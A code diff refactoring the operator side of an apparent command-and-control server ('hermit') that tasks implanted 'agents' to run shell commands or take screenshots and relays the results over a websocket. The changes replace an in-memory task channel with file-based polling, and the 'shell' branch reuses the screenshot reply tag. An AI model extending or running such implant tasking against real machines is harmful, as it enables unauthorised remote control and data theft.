@@ -7,7 +7,7 @@ use axum::{
     Router,
 };
 use axum_extra::TypedHeader;
-use log::{error, info};
+use log::{error, info, warn};
 use std::io::{Error, ErrorKind};
 use std::net::SocketAddr;
 use std::sync::Arc;
@@ -22,7 +22,7 @@ use super::{jobs::{check_dupl_job, find_job, format_listeners, Job, JobMessage},
 use super::agents::{Agent, format_agents};
 use crate::implants::{generate::generate, implant::{format_implants, Implant}};
 use crate::config::Config;
-// use super::sessions::Session;
+use crate::utils::fs::{empty_file, read_file, write_file};
 
 #[derive(Debug)]
 pub struct Server {
@@ -31,18 +31,12 @@ pub struct Server {
     tx_job: Arc<Mutex<broadcast::Sender<JobMessage>>>,
     pub agents: Arc<Mutex<Vec<Agent>>>,
     pub implants: Arc<Mutex<Vec<Implant>>>,
-    // sessions: Vec<Session>,
-
-    pub tx_result: Arc<Mutex<broadcast::Sender<String>>>,
-    pub rx_result: Arc<Mutex<broadcast::Receiver<String>>>,
 }
 
 impl Server {
     pub fn new(
         config: Config,
         tx_job: broadcast::Sender<JobMessage>,
-        tx_result: broadcast::Sender<String>,
-        rx_result: broadcast::Receiver<String>,
     ) -> Self {
         Self {
             config,
@@ -50,10 +44,6 @@ impl Server {
             tx_job: Arc::new(Mutex::new(tx_job)),
             agents: Arc::new(Mutex::new(Vec::new())),
             implants: Arc::new(Mutex::new(Vec::new())),
-            // sessions: Vec::new(),
-
-            tx_result: Arc::new(Mutex::new(tx_result)),
-            rx_result: Arc::new(Mutex::new(rx_result)),
         }
     }
 
@@ -104,66 +94,11 @@ impl Server {
         implants.push(new_implant.to_owned());
         Ok(())
     }
-
-    pub async fn set_task(&mut self, agent_name: String, task: String) -> Result<(), Error> {
-        // Get target agent
-        let mut target_agent: Option<&mut Agent> = None;
-        let mut agents = self.agents.lock().await;
-        for agent in agents.iter_mut() {
-            if agent.name == agent_name {
-                target_agent = Some(agent);
-                break;
-            }
-        }
-
-        // Set task for the agent
-        if let Some(ta) = target_agent {
-            if task == "screenshot" {
-                ta.task = AgentTask::Screenshot;
-            } else if task.starts_with("shell") {
-                if let Ok(args) = shellwords::split(&task) {
-                    ta.task = AgentTask::Shell(args[1..].join(" "));
-                } else {
-                    return Err(Error::new(ErrorKind::InvalidInput, "Invalid shell command."));
-                }
-            } else {
-                return Err(Error::new(ErrorKind::InvalidInput, "Invalid task."));
-            }
-        } else {
-            error!("Target agent not found.");
-            return Err(Error::new(ErrorKind::NotFound, "Agent not found."));
-        }
-
-        info!("Set task successfully. Task: {task}");
-
-        Ok(())
-    }
-
-    pub async fn get_task_result(&mut self, agent_name: String) -> Result<Option<Vec<u8>>, Error> {
-        // Get target agent
-        let mut target_agent: Option<&mut Agent> = None;
-        let mut agents = self.agents.lock().await;
-        for agent in agents.iter_mut() {
-            if agent.name == agent_name {
-                target_agent = Some(agent);
-                break;
-            }
-        }
-
-        // Get task for the agent
-        if let Some(ta) = target_agent {
-            let task_result = ta.task_result.clone();
-            return Ok(task_result);
-        } else {
-            return Err(Error::new(ErrorKind::NotFound, "Agent not found."));
-        }
-    }
 }
 
 pub async fn run(config: Config) {
     let (tx_job, _rx_job) = broadcast::channel(100);
-    let (tx_result, rx_result) = broadcast::channel(100);
-    let server = Arc::new(Mutex::new(Server::new(config, tx_job, tx_result, rx_result)));
+    let server = Arc::new(Mutex::new(Server::new(config, tx_job)));
 
     let app = Router::new()
         .route("/hermit", get(ws_handler))
@@ -207,26 +142,7 @@ async fn ws_handler(
 
 async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Server>>)  {
     let socket_arc = Arc::new(Mutex::new(socket));
-
-    // Thread for fetching task results and sending operators.
-    // let socket_arc_clone = Arc::clone(&socket_arc);
-    // let server_clone = Arc::clone(&server);
-
-    let (tx, mut rx) = broadcast::channel::<String>(100);
-    
-    tokio::spawn(async move {
-        let rx_arc = Arc::new(Mutex::new(rx));
-        let mut rx_lock = rx_arc.lock().await;
-
-        while let Ok(_agent_name) = rx_lock.recv().await {
-
-            loop {
-                info!("Getting task result...");
-                std::thread::sleep(std::time::Duration::from_secs(5));
-            }
-        }
-    });
-    
+        
     loop {
         let socket_clone = Arc::clone(&socket_arc);
         let mut socket_lock = socket_clone.lock().await;
@@ -522,28 +438,72 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                 let ag_name = args[1].to_owned();
 
                                 match args[2].as_str() {
-                                    "screenshot" | "shell" => {
-                                        // Write the task to file
-                                        server_lock.config.write_file(
-                                            format!(
-                                                "agents/{}/task/name", ag_name.to_owned()),
-                                                args[2..].join(" ")).unwrap();
+                                    "screenshot" => {
+                                        if let Ok(_) = write_file(format!("agents/{}/task/name", ag_name.to_owned()), args[2..].join(" ").as_bytes()) {
+                                            info!("Task set successfully.");
+                                        } else {
+                                            error!("Task could not be set.");
+                                            let _ = socket_lock.send(Message::Text("[task:error] Could not set a task.".to_owned())).await;
+                                            let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
+                                            continue;
+                                        }
 
-                                        tx.send(ag_name).unwrap();
+                                        loop {
+                                            info!("Getting task result...");
+                                            tokio::time::sleep(tokio::time::Duration::from_secs(3)).await;
+
+                                            if let Ok(task_result) = read_file(format!("agents/{}/task/result", ag_name.to_owned())) {
+                                                if task_result.len() > 0 {
+                                                    info!("task result found!");
+                                                    let _ = socket_lock.send(Message::Text("[task:screenshot:ok]".to_owned())).await;
+                                                    let _ = socket_lock.send(Message::Binary(task_result)).await;
+                                                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
+
+                                                    // Initialize the task result
+                                                    empty_file(format!("agents/{}/task/result", ag_name.to_owned())).unwrap();
+                                                    break;
+                                                } else {
+                                                    warn!("task result is empty.");
+                                                }
+                                            } else {
+                                                error!("Could not read `task/result` file.");
+                                                break;
+                                            }
+                                        }
                                     }
-                                    // "screenshot" => {
-                                    //     if let Err(e) = server_lock.set_task(ag_name.to_owned(), "screenshot".to_owned()).await {
-                                    //         let _ = socket_lock.send(Message::Text("[task:error] Could not set a task.".to_owned())).await;
-                                    //         let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
-                                    //     }
-                                    // }
-                                    // "shell" => {
-                                    //     let command = args[3..].join(" ");
-                                    //     if let Err(e) = server_lock.set_task(ag_name.to_owned(), command.to_owned()).await {
-                                    //         let _ = socket_lock.send(Message::Text("[task:error] Could not set a task.".to_owned())).await;
-                                    //         let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
-                                    //     }
-                                    // }
+                                    "shell" => {
+                                        if let Ok(_) = write_file(format!("agents/{}/task/name", ag_name.to_owned()), args[2..].join(" ").as_bytes()) {
+                                            info!("Task set successfully.");
+                                        } else {
+                                            error!("Task could not be set.");
+                                            let _ = socket_lock.send(Message::Text("[task:error] Could not set a task.".to_owned())).await;
+                                            let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
+                                            continue;
+                                        }
+
+                                        loop {
+                                            info!("Getting task result...");
+                                            tokio::time::sleep(tokio::time::Duration::from_secs(3)).await;
+
+                                            if let Ok(task_result) = read_file(format!("agents/{}/task/result", ag_name.to_owned())) {
+                                                if task_result.len() > 0 {
+                                                    info!("task result found!");
+                                                    let _ = socket_lock.send(Message::Text("[task:screenshot:ok]".to_owned())).await;
+                                                    let _ = socket_lock.send(Message::Binary(task_result)).await;
+                                                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
+
+                                                    // Initialize the task result
+                                                    empty_file(format!("agents/{}/task/result", ag_name.to_owned())).unwrap();
+                                                    break;
+                                                } else {
+                                                    warn!("task result is empty.");
+                                                }
+                                            } else {
+                                                error!("Could not read `task/result` file.");
+                                                break;
+                                            }
+                                        }
+                                    }
                                     _ => {
                                         let _ = socket_lock.send(Message::Text(format!("Unknown command: {text}"))).await;
                                         let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
